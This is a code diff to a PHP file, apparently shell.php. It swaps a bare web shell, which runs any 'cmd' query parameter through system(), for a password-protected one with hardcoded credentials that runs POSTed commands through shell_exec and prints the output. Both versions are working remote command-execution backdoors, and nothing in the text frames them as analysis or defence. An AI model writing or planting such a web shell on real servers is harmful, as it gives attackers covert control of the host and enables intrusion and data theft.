@@ -1,17 +1,41 @@
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
 <?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
+session_start();
+
+/* --- CONFIG --- */
+$USER = "admin";
+$PASS = "motdepasse";
+
+/* --- LOGIN --- */
+if (!isset($_SESSION["ok"])) {
+    if (!empty($_POST["u"]) && !empty($_POST["p"])) {
+        if ($_POST["u"] === $USER && $_POST["p"] === $PASS) {
+            $_SESSION["ok"] = true;
+            header("Location: shell.php");
+            exit;
+        }
     }
+
+    echo '<form method="POST">
+            User:<br><input name="u"><br>
+            Pass:<br><input type="password" name="p"><br>
+            <button>Login</button>
+          </form>';
+    exit;
+}
+
+/* --- EXECUTION --- */
+$out = "";
+if (isset($_POST["cmd"])) {
+    $cmd = trim($_POST["cmd"]);
+    $parts = explode(" ", $cmd);
+    $out = shell_exec(escapeshellcmd($cmd) . " 2>&1");
+    
+}
 ?>
-</pre>
-</body>
-<script>document.getElementById("cmd").focus();</script>
-</html>
+
+<form method="POST">
+    <input name="cmd" style="width:300px;">
+    <button>OK</button>
+</form>
+
+<pre><?php echo htmlspecialchars($out); ?></pre>
